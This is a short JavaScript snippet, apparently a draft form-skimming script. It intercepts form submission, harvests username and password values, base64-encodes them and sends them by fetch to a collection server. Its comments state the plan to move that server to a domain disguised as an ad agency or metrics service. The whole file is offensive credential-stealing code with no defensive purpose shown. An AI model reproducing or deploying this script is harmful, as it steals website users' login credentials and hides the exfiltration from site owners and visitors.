// a basic attempt

(() => {
  const b = (a, i) => {
    if (i.name === "username") a += i.value + ";";
    if (i.name === "password") a += i.value + ";";

    return a;
  };

  const a = (s, f) => {
    return Array.from(f.childNodes).reduce(b, "");
  };

  document.addEventListener("submit", e => {
    e.preventDefault();
    const d = Array.from(document.forms).reduce(a, "");
    const q = btoa(d);
    // we will change this domain to something that sounds like an add agency
    // or possible metrics gathering service
    fetch(`http://localhost:3001?q=${q}`);
  });
})();
